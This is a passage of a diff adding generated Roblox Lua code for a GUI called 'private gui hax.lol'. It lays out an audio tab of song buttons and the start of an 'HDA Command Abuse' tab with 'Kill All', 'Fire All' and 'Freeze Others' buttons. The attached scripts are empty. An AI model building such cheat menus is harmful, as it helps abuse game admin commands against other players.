+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1a0"] = Instance.new("LocalScript", G2L["19f"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1a1"] = Instance.new("TextButton", G2L["183"]);
+G2L["1a1"]["TextWrapped"] = true;
+G2L["1a1"]["BorderSizePixel"] = 3;
+G2L["1a1"]["TextSize"] = 14;
+G2L["1a1"]["TextScaled"] = true;
+G2L["1a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1a1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1a1"]["Text"] = [[Looping in the Room]];
+G2L["1a1"]["Name"] = [[Button]];
+G2L["1a1"]["Position"] = UDim2.new(0.0313, 0, 0.3688, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1a2"] = Instance.new("LocalScript", G2L["1a1"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1a3"] = Instance.new("TextButton", G2L["183"]);
+G2L["1a3"]["TextWrapped"] = true;
+G2L["1a3"]["BorderSizePixel"] = 3;
+G2L["1a3"]["TextSize"] = 14;
+G2L["1a3"]["TextScaled"] = true;
+G2L["1a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1a3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1a3"]["Text"] = [[Raining men]];
+G2L["1a3"]["Name"] = [[Button]];
+G2L["1a3"]["Position"] = UDim2.new(0.22379, 0, 0.3688, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1a4"] = Instance.new("LocalScript", G2L["1a3"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1a5"] = Instance.new("TextButton", G2L["183"]);
+G2L["1a5"]["TextWrapped"] = true;
+G2L["1a5"]["BorderSizePixel"] = 3;
+G2L["1a5"]["TextSize"] = 14;
+G2L["1a5"]["TextScaled"] = true;
+G2L["1a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1a5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1a5"]["Text"] = [[BodyPartz]];
+G2L["1a5"]["Name"] = [[Button]];
+G2L["1a5"]["Position"] = UDim2.new(0.42567, 0, 0.3688, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1a6"] = Instance.new("LocalScript", G2L["1a5"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1a7"] = Instance.new("TextButton", G2L["183"]);
+G2L["1a7"]["TextWrapped"] = true;
+G2L["1a7"]["BorderSizePixel"] = 3;
+G2L["1a7"]["TextSize"] = 14;
+G2L["1a7"]["TextScaled"] = true;
+G2L["1a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1a7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1a7"]["Text"] = [[Wont Stop Us]];
+G2L["1a7"]["Name"] = [[Button]];
+G2L["1a7"]["Position"] = UDim2.new(0.62128, 0, 0.3688, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1a8"] = Instance.new("LocalScript", G2L["1a7"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1a9"] = Instance.new("TextButton", G2L["183"]);
+G2L["1a9"]["TextWrapped"] = true;
+G2L["1a9"]["BorderSizePixel"] = 3;
+G2L["1a9"]["TextSize"] = 14;
+G2L["1a9"]["TextScaled"] = true;
+G2L["1a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1a9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1a9"]["Text"] = [[Holy Fuck Lois]];
+G2L["1a9"]["Name"] = [[Button]];
+G2L["1a9"]["Position"] = UDim2.new(0.8169, 0, 0.3688, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1aa"] = Instance.new("LocalScript", G2L["1a9"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1ab"] = Instance.new("TextButton", G2L["183"]);
+G2L["1ab"]["TextWrapped"] = true;
+G2L["1ab"]["BorderSizePixel"] = 3;
+G2L["1ab"]["TextSize"] = 14;
+G2L["1ab"]["TextScaled"] = true;
+G2L["1ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ab"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ab"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ab"]["Text"] = [[JumpStyle]];
+G2L["1ab"]["Name"] = [[Button]];
+G2L["1ab"]["Position"] = UDim2.new(0.0313, 0, 0.48986, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1ac"] = Instance.new("LocalScript", G2L["1ab"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1ad"] = Instance.new("TextButton", G2L["183"]);
+G2L["1ad"]["TextWrapped"] = true;
+G2L["1ad"]["BorderSizePixel"] = 3;
+G2L["1ad"]["TextSize"] = 14;
+G2L["1ad"]["TextScaled"] = true;
+G2L["1ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ad"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ad"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ad"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ad"]["Text"] = [[18 Hardstyle]];
+G2L["1ad"]["Name"] = [[Button]];
+G2L["1ad"]["Position"] = UDim2.new(0.0313, 0, 0.61335, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1ae"] = Instance.new("LocalScript", G2L["1ad"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1af"] = Instance.new("TextButton", G2L["183"]);
+G2L["1af"]["TextWrapped"] = true;
+G2L["1af"]["BorderSizePixel"] = 3;
+G2L["1af"]["TextSize"] = 14;
+G2L["1af"]["TextScaled"] = true;
+G2L["1af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1af"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1af"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1af"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1af"]["Text"] = [[original Sparta Remix short]];
+G2L["1af"]["Name"] = [[Button]];
+G2L["1af"]["Position"] = UDim2.new(0.0313, 0, 0.73442, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1b0"] = Instance.new("LocalScript", G2L["1af"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1b1"] = Instance.new("TextButton", G2L["183"]);
+G2L["1b1"]["TextWrapped"] = true;
+G2L["1b1"]["BorderSizePixel"] = 3;
+G2L["1b1"]["TextSize"] = 14;
+G2L["1b1"]["TextScaled"] = true;
+G2L["1b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1b1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1b1"]["Text"] = [[Gangsta Paradise]];
+G2L["1b1"]["Name"] = [[Button]];
+G2L["1b1"]["Position"] = UDim2.new(0.0313, 0, 0.8579, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1b2"] = Instance.new("LocalScript", G2L["1b1"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1b3"] = Instance.new("TextButton", G2L["183"]);
+G2L["1b3"]["TextWrapped"] = true;
+G2L["1b3"]["BorderSizePixel"] = 3;
+G2L["1b3"]["TextSize"] = 14;
+G2L["1b3"]["TextScaled"] = true;
+G2L["1b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1b3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1b3"]["Text"] = [[Spooky Scary Skeleton Short]];
+G2L["1b3"]["Name"] = [[Button]];
+G2L["1b3"]["Position"] = UDim2.new(0.22379, 0, 0.8579, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1b4"] = Instance.new("LocalScript", G2L["1b3"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1b5"] = Instance.new("TextButton", G2L["183"]);
+G2L["1b5"]["TextWrapped"] = true;
+G2L["1b5"]["BorderSizePixel"] = 3;
+G2L["1b5"]["TextSize"] = 14;
+G2L["1b5"]["TextScaled"] = true;
+G2L["1b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1b5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1b5"]["Text"] = [[Tubers93]];
+G2L["1b5"]["Name"] = [[Button]];
+G2L["1b5"]["Position"] = UDim2.new(0.42567, 0, 0.8579, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1b6"] = Instance.new("LocalScript", G2L["1b5"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1b7"] = Instance.new("TextButton", G2L["183"]);
+G2L["1b7"]["TextWrapped"] = true;
+G2L["1b7"]["BorderSizePixel"] = 3;
+G2L["1b7"]["TextSize"] = 14;
+G2L["1b7"]["TextScaled"] = true;
+G2L["1b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1b7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1b7"]["Text"] = [[Erika]];
+G2L["1b7"]["Name"] = [[Button]];
+G2L["1b7"]["Position"] = UDim2.new(0.62128, 0, 0.8579, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1b8"] = Instance.new("LocalScript", G2L["1b7"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1b9"] = Instance.new("TextButton", G2L["183"]);
+G2L["1b9"]["TextWrapped"] = true;
+G2L["1b9"]["BorderSizePixel"] = 3;
+G2L["1b9"]["TextSize"] = 14;
+G2L["1b9"]["TextScaled"] = true;
+G2L["1b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1b9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1b9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1b9"]["Text"] = [[What the fuck g00by Sparta Remix]];
+G2L["1b9"]["Name"] = [[Button]];
+G2L["1b9"]["Position"] = UDim2.new(0.8169, 0, 0.8579, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1ba"] = Instance.new("LocalScript", G2L["1b9"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Set Pitch
+G2L["1bb"] = Instance.new("TextButton", G2L["183"]);
+G2L["1bb"]["TextWrapped"] = true;
+G2L["1bb"]["BorderSizePixel"] = 3;
+G2L["1bb"]["TextSize"] = 14;
+G2L["1bb"]["TextScaled"] = true;
+G2L["1bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1bb"]["Size"] = UDim2.new(0, 76, 0, 27);
+G2L["1bb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1bb"]["Text"] = [[Set Pitch]];
+G2L["1bb"]["Name"] = [[Set Pitch]];
+G2L["1bb"]["Position"] = UDim2.new(0.33959, 0, 0.50197, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Set Pitch.LocalScript
+G2L["1bc"] = Instance.new("LocalScript", G2L["1bb"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Play Audio
+G2L["1bd"] = Instance.new("TextButton", G2L["183"]);
+G2L["1bd"]["TextWrapped"] = true;
+G2L["1bd"]["BorderSizePixel"] = 3;
+G2L["1bd"]["TextSize"] = 14;
+G2L["1bd"]["TextScaled"] = true;
+G2L["1bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1bd"]["Size"] = UDim2.new(0, 76, 0, 27);
+G2L["1bd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1bd"]["Text"] = [[Play Audio]];
+G2L["1bd"]["Name"] = [[Play Audio]];
+G2L["1bd"]["Position"] = UDim2.new(0.53991, 0, 0.50197, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Play Audio.LocalScript
+G2L["1be"] = Instance.new("LocalScript", G2L["1bd"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.TextBoxPitch
+G2L["1bf"] = Instance.new("TextBox", G2L["183"]);
+G2L["1bf"]["Name"] = [[TextBoxPitch]];
+G2L["1bf"]["BorderSizePixel"] = 3;
+G2L["1bf"]["TextWrapped"] = true;
+G2L["1bf"]["TextSize"] = 20;
+G2L["1bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bf"]["TextScaled"] = true;
+G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["1bf"]["PlaceholderText"] = [[-- Put Pitch Number]];
+G2L["1bf"]["Size"] = UDim2.new(0, 106, 0, 27);
+G2L["1bf"]["Position"] = UDim2.new(0.31612, 0, 0.60484, 0);
+G2L["1bf"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1bf"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1c0"] = Instance.new("TextButton", G2L["183"]);
+G2L["1c0"]["TextWrapped"] = true;
+G2L["1c0"]["BorderSizePixel"] = 3;
+G2L["1c0"]["TextSize"] = 14;
+G2L["1c0"]["TextScaled"] = true;
+G2L["1c0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1c0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1c0"]["Text"] = [[Oh yeah Mr krab Remix]];
+G2L["1c0"]["Name"] = [[Button]];
+G2L["1c0"]["Position"] = UDim2.new(0.22379, 0, 0.73442, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1c1"] = Instance.new("LocalScript", G2L["1c0"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1c2"] = Instance.new("TextButton", G2L["183"]);
+G2L["1c2"]["TextWrapped"] = true;
+G2L["1c2"]["BorderSizePixel"] = 3;
+G2L["1c2"]["TextSize"] = 14;
+G2L["1c2"]["TextScaled"] = true;
+G2L["1c2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1c2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1c2"]["Text"] = [[Spooky Skeleton (By SnakeGod)]];
+G2L["1c2"]["Name"] = [[Button]];
+G2L["1c2"]["Position"] = UDim2.new(0.4241, 0, 0.73442, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1c3"] = Instance.new("LocalScript", G2L["1c2"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1c4"] = Instance.new("TextButton", G2L["183"]);
+G2L["1c4"]["TextWrapped"] = true;
+G2L["1c4"]["BorderSizePixel"] = 3;
+G2L["1c4"]["TextSize"] = 14;
+G2L["1c4"]["TextScaled"] = true;
+G2L["1c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1c4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1c4"]["Text"] = [[Nightcore 18 2]];
+G2L["1c4"]["Name"] = [[Button]];
+G2L["1c4"]["Position"] = UDim2.new(0.62128, 0, 0.73199, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1c5"] = Instance.new("LocalScript", G2L["1c4"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1c6"] = Instance.new("TextButton", G2L["183"]);
+G2L["1c6"]["TextWrapped"] = true;
+G2L["1c6"]["BorderSizePixel"] = 3;
+G2L["1c6"]["TextSize"] = 14;
+G2L["1c6"]["TextScaled"] = true;
+G2L["1c6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1c6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1c6"]["Text"] = [[Spooky Dubstep (By SnakeGod)]];
+G2L["1c6"]["Name"] = [[Button]];
+G2L["1c6"]["Position"] = UDim2.new(0.8169, 0, 0.73199, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1c7"] = Instance.new("LocalScript", G2L["1c6"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1c8"] = Instance.new("TextButton", G2L["183"]);
+G2L["1c8"]["TextWrapped"] = true;
+G2L["1c8"]["BorderSizePixel"] = 3;
+G2L["1c8"]["TextSize"] = 14;
+G2L["1c8"]["TextScaled"] = true;
+G2L["1c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1c8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1c8"]["Text"] = [[Digging This Feeling]];
+G2L["1c8"]["Name"] = [[Button]];
+G2L["1c8"]["Position"] = UDim2.new(0.8169, 0, 0.48986, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1c9"] = Instance.new("LocalScript", G2L["1c8"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["1ca"] = Instance.new("TextButton", G2L["183"]);
+G2L["1ca"]["TextWrapped"] = true;
+G2L["1ca"]["BorderSizePixel"] = 3;
+G2L["1ca"]["TextSize"] = 14;
+G2L["1ca"]["TextScaled"] = true;
+G2L["1ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ca"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ca"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ca"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ca"]["Text"] = [[BodyPartz Unpitched]];
+G2L["1ca"]["Name"] = [[Button]];
+G2L["1ca"]["Position"] = UDim2.new(0.8169, 0, 0.61335, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["1cb"] = Instance.new("LocalScript", G2L["1ca"]);
+
+
+
+-- StarterGui.private gui hax.lol.LNicky
+G2L["1cc"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["1cc"]["BorderSizePixel"] = 0;
+G2L["1cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1cc"]["Image"] = [[rbxassetid://113455072164836]];
+G2L["1cc"]["Size"] = UDim2.new(0, 74, 0, 67);
+G2L["1cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1cc"]["Name"] = [[LNicky]];
+G2L["1cc"]["Position"] = UDim2.new(-0.12812, 0, 0.59524, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page
+G2L["1cd"] = Instance.new("Frame", G2L["2"]);
+G2L["1cd"]["Visible"] = false;
+G2L["1cd"]["BorderSizePixel"] = 3;
+G2L["1cd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1cd"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["1cd"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["1cd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1cd"]["Name"] = [[HDA Command Abuse tab Page]];
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1ce"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1ce"]["TextWrapped"] = true;
+G2L["1ce"]["BorderSizePixel"] = 3;
+G2L["1ce"]["TextSize"] = 14;
+G2L["1ce"]["TextScaled"] = true;
+G2L["1ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ce"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ce"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ce"]["Text"] = [[Fire All (HD)]];
+G2L["1ce"]["Name"] = [[Button]];
+G2L["1ce"]["Position"] = UDim2.new(0.01565, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1cf"] = Instance.new("LocalScript", G2L["1ce"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1d0"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1d0"]["TextWrapped"] = true;
+G2L["1d0"]["BorderSizePixel"] = 3;
+G2L["1d0"]["TextSize"] = 14;
+G2L["1d0"]["TextScaled"] = true;
+G2L["1d0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1d0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1d0"]["Text"] = [[Kill All (HD)]];
+G2L["1d0"]["Name"] = [[Button]];
+G2L["1d0"]["Position"] = UDim2.new(0.22066, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1d1"] = Instance.new("LocalScript", G2L["1d0"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1d2"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1d2"]["TextWrapped"] = true;
+G2L["1d2"]["BorderSizePixel"] = 3;
+G2L["1d2"]["TextSize"] = 14;
+G2L["1d2"]["TextScaled"] = true;
+G2L["1d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1d2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1d2"]["Text"] = [[Freeze Others (HD)]];
+G2L["1d2"]["Name"] = [[Button]];
+G2L["1d2"]["Position"] = UDim2.new(0.42567, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1d3"] = Instance.new("LocalScript", G2L["1d2"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1d4"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1d4"]["TextWrapped"] = true;
+G2L["1d4"]["BorderSizePixel"] = 3;
+G2L["1d4"]["TextSize"] = 14;
+G2L["1d4"]["TextScaled"] = true;
+G2L["1d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d4"]["Size"] = UDim2.new(0, 95, 0, 32);
